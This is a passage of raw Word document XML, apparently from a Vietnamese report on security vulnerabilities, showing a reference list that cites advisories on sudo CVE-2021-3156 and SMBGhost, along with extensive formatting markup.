      <w:r w:rsidRPr="00BF62A0">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>iế</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>ng v</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF62A0">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>iệt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="357FCFB7" w14:textId="02BA23DA" w:rsidR="008F7596" w:rsidRPr="00BF62A0" w:rsidRDefault="00AB6843" w:rsidP="00752B4D">
      <w:pPr>
        <w:pStyle w:val="Tiliuthamkho"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">[1].  </w:t>
      </w:r>
      <w:r w:rsidR="00404722" w:rsidRPr="00404722">
        <w:t xml:space="preserve">https://ntshanoi.com.vn/phan-mem-ro-quet-lo-hong-bao-mat.html </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41A44374" w14:textId="63307D8E" w:rsidR="008F7596" w:rsidRDefault="00AB6843" w:rsidP="00AB6843">
      <w:pPr>
        <w:pStyle w:val="Tiliuthamkho"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">[2].  </w:t>
      </w:r>
      <w:r w:rsidR="00404722" w:rsidRPr="00404722">
        <w:t>https://nhanhoa.com/tin-tuc/canh-bao-lo-hong-bao-mat-cve20213156-cho-phep-nguoi-dung-cuc-bo-chiem-dac-quyen-root.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55BCA32A" w14:textId="71DD6E2E" w:rsidR="008F7596" w:rsidRPr="00BF62A0" w:rsidRDefault="008F7596" w:rsidP="000B08BE">
      <w:pPr>
        <w:pStyle w:val="Tiliuthamkho"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Tài liệu tiếng Anh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26F307F1" w14:textId="424830B4" w:rsidR="008F7596" w:rsidRPr="00CA2A10" w:rsidRDefault="00AB6843" w:rsidP="00AB6843">
      <w:pPr>
        <w:pStyle w:val="Tiliuthamkho"/>
      </w:pPr>
      <w:r>
        <w:t>[1].</w:t>
      </w:r>
      <w:r w:rsidR="00364A4F">
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="00752B4D" w:rsidRPr="00752B4D">
        <w:t>https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</w:t>
      </w:r>
      <w:r w:rsidR="001C3045" w:rsidRPr="001C3045">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A91D10" w14:textId="793D622E" w:rsidR="00477B63" w:rsidRDefault="00364A4F" w:rsidP="000B08BE">
      <w:pPr>
        <w:pStyle w:val="Tiliuthamkho"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">[2].  </w:t>
      </w:r>
      <w:hyperlink r:id="rId39" w:history="1">
        <w:r w:rsidR="00943403" w:rsidRPr="00F42A97">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.trellix.com/blogs/research/smbghost-analysis-of-cve-2020-0796/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="001C3045" w:rsidRPr="001C3045">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59D05B1A" w14:textId="57F513F7" w:rsidR="00943403" w:rsidRDefault="00943403" w:rsidP="000B08BE">
      <w:pPr>
        <w:pStyle w:val="Tiliuthamkho"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">[3]. </w:t>
      </w:r>
      <w:hyperlink r:id="rId40" w:history="1">
        <w:r w:rsidRPr="00F42A97">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://github.com/CptGibbon/CVE-2021-3156</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="375E5194" w14:textId="558A46F0" w:rsidR="00943403" w:rsidRDefault="00943403" w:rsidP="000B08BE">
      <w:pPr>
        <w:pStyle w:val="Tiliuthamkho"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">[4]. </w:t>
      </w:r>
      <w:hyperlink r:id="rId41" w:anchor=":~:text=Shellcode%20can%20be%20either%20local,to%20it%20across%20a%20network" w:history="1">
        <w:r w:rsidR="00F2370F" w:rsidRPr="00F42A97">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.techtarget.com/searchsecurity/answer/What-is-the-relationship-between-shellcode-and-exploit-code#:~:text=Shellcode%20can%20be%20either%20local,to%20it%20across%20a%20network</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="42B679DA" w14:textId="6395266E" w:rsidR="00F2370F" w:rsidRDefault="00F2370F" w:rsidP="000B08BE">
      <w:pPr>
        <w:pStyle w:val="Tiliuthamkho"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">[5]. </w:t>
      </w:r>
      <w:r w:rsidRPr="00F2370F">
        <w:t>https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="752A65F7" w14:textId="4F1B611A" w:rsidR="00686263" w:rsidRPr="006605CE" w:rsidRDefault="00686263" w:rsidP="008D2D9A">
      <w:pPr>
        <w:pStyle w:val="Tiliuthamkho"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:rPr>
          <w:lang w:val="de-DE"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="00686263" w:rsidRPr="006605CE" w:rsidSect="00D22C9A">
      <w:headerReference w:type="default" r:id="rId42"/>
      <w:pgSz w:w="11906" w:h="16838" w:code="9"/>
      <w:pgMar w:top="1138"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B4B2A" w14:textId="77777777" w:rsidR="00AA49C8" w:rsidRDefault="00AA49C8" w:rsidP="00877142">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="6F1BBF81" w14:textId="77777777" w:rsidR="00AA49C8" w:rsidRDefault="00AA49C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0295830"/>
      <w:docPartObj>
        <w:docPartGallery w:val="Page Numbers (Bottom of Page)"/>
        <w:docPartUnique/>
      </w:docPartObj>
    </w:sdtPr>
    <w:sdtEndPr>
      <w:rPr>
        <w:noProof/>
      </w:rPr>
    </w:sdtEndPr>
    <w:sdtContent>
      <w:p w14:paraId="78426D82" w14:textId="47456638" w:rsidR="00540D59" w:rsidRDefault="00540D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3D7E2B" w14:textId="77777777" w:rsidR="00540D59" w:rsidRDefault="00540D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599674"/>
      <w:docPartObj>
        <w:docPartGallery w:val="Page Numbers (Bottom of Page)"/>
        <w:docPartUnique/>
      </w:docPartObj>
    </w:sdtPr>
    <w:sdtEndPr>
      <w:rPr>
        <w:noProof/>
      </w:rPr>
    </w:sdtEndPr>
    <w:sdtContent>
      <w:p w14:paraId="2855EFF3" w14:textId="004A3128" w:rsidR="008A7EEE" w:rsidRDefault="008A7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9CB50B" w14:textId="77777777" w:rsidR="008A7EEE" w:rsidRDefault="008A7E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C8A48" w14:textId="77777777" w:rsidR="00AA49C8" w:rsidRDefault="00AA49C8" w:rsidP="00877142">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="3E35F495" w14:textId="77777777" w:rsidR="00AA49C8" w:rsidRDefault="00AA49C8"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AC348" w14:textId="77777777" w:rsidR="008A7EEE" w:rsidRDefault="008A7E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60A3C" w14:textId="77777777" w:rsidR="008A7EEE" w:rsidRDefault="008A7E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7DA7523"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="5E72A0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7DD471C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="3D4036A2"/>
    <w:lvl w:ilvl="0" w:tplc="59EAEF1C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="ListParagraph"/>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890338A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="D854A47C"/>
    <w:lvl w:ilvl="0" w:tplc="BA3C10F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A27DD"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="E5CA263E"/>
    <w:lvl w:ilvl="0" w:tplc="5D867B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2239F9"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F1141F48"/>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bCs/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="Heading4"/>
      <w:suff w:val="space"/>
      <w:lvlText w:val="%1.%2.%3.%4"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="0" w:firstLine="0"/>
      </w:p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375356B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="2908A44E"/>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227D19"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6826D022"/>
    <w:styleLink w:val="nhsmc"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:suff w:val="space"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="270" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2367" w:hanging="567"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="135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7A24CCE"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="5D0283B2"/>
    <w:lvl w:ilvl="0" w:tplc="F3AA7F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B36CE8"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="5ED0CDF0"/>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05A71"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="D050033C"/>
    <w:lvl w:ilvl="0" w:tplc="1F52185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E1E1ACC"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="94783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776DD4"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="554A8106"/>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C057EA"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="083AD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70049E"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="82CE7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A81F67"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="493E2E42"/>
    <w:lvl w:ilvl="0" w:tplc="1F52185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91700A1"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="87241B5C"/>
    <w:lvl w:ilvl="0" w:tplc="5E2888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73D24"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="9F1A4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586357"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="BA224520"/>
    <w:numStyleLink w:val="Style1"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="21" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="32756E5D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="4F1650D8"/>
    <w:lvl w:ilvl="0" w:tplc="0E6453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2F3426B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="6710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531322"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="86FCDC22"/>
    <w:lvl w:ilvl="0" w:tplc="5D867B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E30584"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0AB8A75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24766E5"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="63DEB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FD3277"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="5B1CD9AE"/>
    <w:lvl w:ilvl="0" w:tplc="5E2888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05ABA"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="9CBC4598"/>
    <w:lvl w:ilvl="0" w:tplc="1F5218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2516C1"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="398614D2"/>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661DD5"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="6158DC9C"/>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6849C9"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="D1A40056"/>
    <w:lvl w:ilvl="0" w:tplc="5D867B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541621"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="4E20B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8237856"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="76D2B9A8"/>
    <w:lvl w:ilvl="0" w:tplc="5D867B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9FE2DE3"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="30CA020E"/>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6D23D1"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="BA224520"/>
    <w:styleLink w:val="Style1"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="DCCT-Level1"/>
      <w:suff w:val="space"/>
      <w:lvlText w:val="Chương %1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1191" w:hanging="1191"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="DCCT-Level2"/>
      <w:suff w:val="space"/>
      <w:lvlText w:val="%1.%2."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="510" w:hanging="510"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="DCCT-Level3"/>
      <w:suff w:val="space"/>
      <w:lvlText w:val="%1.%2.%3."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1247" w:hanging="737"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="DCCT-Level4"/>
      <w:suff w:val="space"/>
      <w:lvlText w:val="%1.%2.%3.%4."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2211"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A6564C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="AF4A53FA"/>
    <w:lvl w:ilvl="0" w:tplc="0E6453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6982126"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="DCE02D44"/>
    <w:lvl w:ilvl="0" w:tplc="5E2888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20483"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="A892629C"/>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B37110"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="963E60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2941D6"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="C3D2DD3C"/>
    <w:lvl w:ilvl="0" w:tplc="5D867B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347764"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="52F4D186"/>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7ABA0F80"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="84260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FF700A7"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2580F470"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="upperRoman"/>
      <w:pStyle w:val="ChngmcL1"/>
      <w:suff w:val="space"/>
      <w:lvlText w:val="Chương %1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4230" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="ChngmcL2"/>
      <w:isLgl/>
      <w:lvlText w:val="%1.%2."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1276"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238520023">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="636224575">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="2060127396">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1578174492">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1890721591">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="2061585485">
    <w:abstractNumId w:val="34"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="559949175">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="2128313038">
    <w:abstractNumId w:val="42"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="1872499738">
    <w:abstractNumId w:val="35"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="855774066">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="1686397559">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="580991021">
    <w:abstractNumId w:val="27"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="1967082851">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="14" w16cid:durableId="1778984237">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="15" w16cid:durableId="963148978">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="16" w16cid:durableId="11149531">
    <w:abstractNumId w:val="40"/>
  </w:num>
  <w:num w:numId="17" w16cid:durableId="910892722">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="18" w16cid:durableId="421880809">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="19" w16cid:durableId="492184675">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="20" w16cid:durableId="2105295453">
    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="21" w16cid:durableId="1047410347">
    <w:abstractNumId w:val="24"/>
  </w:num>
  <w:num w:numId="22" w16cid:durableId="590700704">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="23" w16cid:durableId="28343078">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="24" w16cid:durableId="355734776">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="25" w16cid:durableId="1084452637">
    <w:abstractNumId w:val="41"/>
  </w:num>
  <w:num w:numId="26" w16cid:durableId="1222254512">
    <w:abstractNumId w:val="31"/>
  </w:num>
  <w:num w:numId="27" w16cid:durableId="74937486">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="28" w16cid:durableId="2130464657">
    <w:abstractNumId w:val="25"/>
  </w:num>
  <w:num w:numId="29" w16cid:durableId="1578133096">
    <w:abstractNumId w:val="37"/>
  </w:num>
  <w:num w:numId="30" w16cid:durableId="792018051">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="31" w16cid:durableId="702481109">
    <w:abstractNumId w:val="29"/>
  </w:num>
  <w:num w:numId="32" w16cid:durableId="5989428">
    <w:abstractNumId w:val="39"/>
  </w:num>
  <w:num w:numId="33" w16cid:durableId="2079858634">
    <w:abstractNumId w:val="38"/>
  </w:num>
  <w:num w:numId="34" w16cid:durableId="1657568004">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="35" w16cid:durableId="1930505320">
    <w:abstractNumId w:val="33"/>
  </w:num>
  <w:num w:numId="36" w16cid:durableId="994920871">
    <w:abstractNumId w:val="28"/>
  </w:num>
  <w:num w:numId="37" w16cid:durableId="1890267601">
    <w:abstractNumId w:val="32"/>
  </w:num>
  <w:num w:numId="38" w16cid:durableId="1797797299">
    <w:abstractNumId w:val="30"/>
  </w:num>
  <w:num w:numId="39" w16cid:durableId="1243487006">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="40" w16cid:durableId="384377768">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="41" w16cid:durableId="443616754">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="42" w16cid:durableId="234753029">
    <w:abstractNumId w:val="26"/>
  </w:num>
  <w:num w:numId="43" w16cid:durableId="1274632623">
    <w:abstractNumId w:val="3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0"/>
  <w:drawingGridVerticalSpacing w:val="38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0E11"/>
    <w:rsid w:val="000114A4"/>
    <w:rsid w:val="000153B1"/>
    <w:rsid w:val="0001618C"/>
    <w:rsid w:val="00017E99"/>
    <w:rsid w:val="00020BE9"/>
    <w:rsid w:val="00022544"/>
    <w:rsid w:val="00023B83"/>
    <w:rsid w:val="000251ED"/>
    <w:rsid w:val="000256D2"/>
    <w:rsid w:val="00026018"/>
    <w:rsid w:val="00026080"/>
    <w:rsid w:val="00026DA0"/>
    <w:rsid w:val="00027C8A"/>
    <w:rsid w:val="0003494B"/>
    <w:rsid w:val="00036E0F"/>
    <w:rsid w:val="00041E81"/>
    <w:rsid w:val="00043C54"/>
    <w:rsid w:val="00046BF8"/>
    <w:rsid w:val="00052BCF"/>
    <w:rsid w:val="00053154"/>
    <w:rsid w:val="00055CD7"/>
    <w:rsid w:val="00056422"/>
    <w:rsid w:val="00057DFD"/>
    <w:rsid w:val="000603BD"/>
    <w:rsid w:val="000617F0"/>
    <w:rsid w:val="000618AC"/>
    <w:rsid w:val="000625DF"/>
    <w:rsid w:val="00063C51"/>
    <w:rsid w:val="00067663"/>
    <w:rsid w:val="00072F60"/>
    <w:rsid w:val="0007322B"/>
    <w:rsid w:val="000739A3"/>
    <w:rsid w:val="00074C8C"/>
    <w:rsid w:val="0007702E"/>
    <w:rsid w:val="00077E54"/>
    <w:rsid w:val="00077EEB"/>
    <w:rsid w:val="0008354F"/>
    <w:rsid w:val="00085CAF"/>
    <w:rsid w:val="00086304"/>
    <w:rsid w:val="0009262A"/>
    <w:rsid w:val="00092782"/>
    <w:rsid w:val="00094A53"/>
    <w:rsid w:val="00094FE4"/>
    <w:rsid w:val="000951D7"/>
    <w:rsid w:val="000956CC"/>
    <w:rsid w:val="000968D4"/>
    <w:rsid w:val="000969E0"/>
    <w:rsid w:val="00097C34"/>
    <w:rsid w:val="000A050A"/>
    <w:rsid w:val="000A05B3"/>
    <w:rsid w:val="000A1874"/>
    <w:rsid w:val="000A2C21"/>
    <w:rsid w:val="000A3FBA"/>
    <w:rsid w:val="000A4186"/>
    <w:rsid w:val="000A5962"/>
    <w:rsid w:val="000A6135"/>
    <w:rsid w:val="000A7272"/>
    <w:rsid w:val="000B001E"/>
    <w:rsid w:val="000B08BE"/>
    <w:rsid w:val="000B0DE3"/>
    <w:rsid w:val="000B21D0"/>
    <w:rsid w:val="000B44A8"/>
    <w:rsid w:val="000B5E98"/>
    <w:rsid w:val="000B6F96"/>
    <w:rsid w:val="000B7749"/>
    <w:rsid w:val="000C072B"/>
    <w:rsid w:val="000C1789"/>
    <w:rsid w:val="000C42F1"/>
    <w:rsid w:val="000C6469"/>
    <w:rsid w:val="000C71D3"/>
    <w:rsid w:val="000D0A8C"/>
    <w:rsid w:val="000D1C59"/>
    <w:rsid w:val="000D2A6A"/>
    <w:rsid w:val="000D5134"/>
    <w:rsid w:val="000E1B47"/>
    <w:rsid w:val="000E3631"/>
    <w:rsid w:val="000E3F49"/>
    <w:rsid w:val="000E77E9"/>
    <w:rsid w:val="000E7E91"/>
    <w:rsid w:val="000F2B9A"/>
    <w:rsid w:val="000F2C2F"/>
    <w:rsid w:val="00101160"/>
    <w:rsid w:val="0010238C"/>
    <w:rsid w:val="001025BE"/>
    <w:rsid w:val="00104B22"/>
    <w:rsid w:val="00107B9D"/>
    <w:rsid w:val="00110411"/>
    <w:rsid w:val="00112F95"/>
    <w:rsid w:val="00113757"/>
    <w:rsid w:val="00116B30"/>
    <w:rsid w:val="0012074D"/>
    <w:rsid w:val="00121690"/>
    <w:rsid w:val="00122CA7"/>
    <w:rsid w:val="00124054"/>
    <w:rsid w:val="00124C0C"/>
    <w:rsid w:val="00124D45"/>
    <w:rsid w:val="0012607A"/>
    <w:rsid w:val="00126DFF"/>
    <w:rsid w:val="001279DE"/>
    <w:rsid w:val="00131948"/>
    <w:rsid w:val="00131A30"/>
    <w:rsid w:val="00131B0E"/>
    <w:rsid w:val="00131C40"/>
    <w:rsid w:val="0013257B"/>
    <w:rsid w:val="00132C85"/>
    <w:rsid w:val="001372C3"/>
    <w:rsid w:val="00137FAB"/>
    <w:rsid w:val="00140C11"/>
    <w:rsid w:val="00142CCF"/>
    <w:rsid w:val="00145C7F"/>
    <w:rsid w:val="00145FFD"/>
    <w:rsid w:val="001471DD"/>
    <w:rsid w:val="00147AF1"/>
    <w:rsid w:val="00150DD6"/>
    <w:rsid w:val="00152131"/>
    <w:rsid w:val="0015417C"/>
    <w:rsid w:val="00154865"/>
    <w:rsid w:val="00160752"/>
    <w:rsid w:val="001620E5"/>
    <w:rsid w:val="00162A1B"/>
    <w:rsid w:val="00165DA9"/>
    <w:rsid w:val="00165DCF"/>
    <w:rsid w:val="001671A0"/>
    <w:rsid w:val="00170BE4"/>
    <w:rsid w:val="0017260A"/>
    <w:rsid w:val="0017718A"/>
    <w:rsid w:val="00177288"/>
    <w:rsid w:val="001773F9"/>
    <w:rsid w:val="001806D1"/>
    <w:rsid w:val="00180B97"/>
    <w:rsid w:val="00180C60"/>
    <w:rsid w:val="00184F6A"/>
    <w:rsid w:val="00186024"/>
    <w:rsid w:val="00190A9D"/>
    <w:rsid w:val="00194288"/>
    <w:rsid w:val="00194B74"/>
    <w:rsid w:val="001A03CF"/>
    <w:rsid w:val="001A34FA"/>
    <w:rsid w:val="001A38A3"/>
    <w:rsid w:val="001A489B"/>
    <w:rsid w:val="001A54B1"/>
    <w:rsid w:val="001A577F"/>
    <w:rsid w:val="001A6A50"/>
    <w:rsid w:val="001A6ED0"/>
    <w:rsid w:val="001B342A"/>
    <w:rsid w:val="001B38AB"/>
    <w:rsid w:val="001B38D3"/>
    <w:rsid w:val="001B52BE"/>
    <w:rsid w:val="001B55A1"/>
    <w:rsid w:val="001C0764"/>
    <w:rsid w:val="001C12B3"/>
    <w:rsid w:val="001C1CC2"/>
    <w:rsid w:val="001C3045"/>
    <w:rsid w:val="001C71C8"/>
    <w:rsid w:val="001D207E"/>
    <w:rsid w:val="001D2968"/>
    <w:rsid w:val="001D30D5"/>
    <w:rsid w:val="001D320E"/>
    <w:rsid w:val="001D371D"/>
    <w:rsid w:val="001D4BD6"/>
    <w:rsid w:val="001D584C"/>
    <w:rsid w:val="001D67B9"/>
    <w:rsid w:val="001D67D7"/>
    <w:rsid w:val="001D6D4E"/>
    <w:rsid w:val="001D773A"/>
    <w:rsid w:val="001E4C07"/>
    <w:rsid w:val="001E5116"/>
    <w:rsid w:val="001F0C93"/>
    <w:rsid w:val="001F0D41"/>
    <w:rsid w:val="001F6400"/>
    <w:rsid w:val="001F6ED2"/>
    <w:rsid w:val="001F750B"/>
    <w:rsid w:val="00206DBE"/>
    <w:rsid w:val="00206FB8"/>
    <w:rsid w:val="00207BC8"/>
    <w:rsid w:val="00214E12"/>
    <w:rsid w:val="00224668"/>
    <w:rsid w:val="00224765"/>
    <w:rsid w:val="00224823"/>
    <w:rsid w:val="00224C4A"/>
    <w:rsid w:val="00224C5E"/>
    <w:rsid w:val="00224E3F"/>
    <w:rsid w:val="00225490"/>
    <w:rsid w:val="00225B4E"/>
    <w:rsid w:val="0023191E"/>
    <w:rsid w:val="002325C2"/>
    <w:rsid w:val="0023412C"/>
    <w:rsid w:val="0023697C"/>
    <w:rsid w:val="00236FF0"/>
    <w:rsid w:val="002403AD"/>
    <w:rsid w:val="0024066F"/>
    <w:rsid w:val="0024068D"/>
    <w:rsid w:val="00243A1C"/>
    <w:rsid w:val="00245797"/>
    <w:rsid w:val="00247AB0"/>
    <w:rsid w:val="00251D11"/>
    <w:rsid w:val="00255648"/>
    <w:rsid w:val="00256FC0"/>
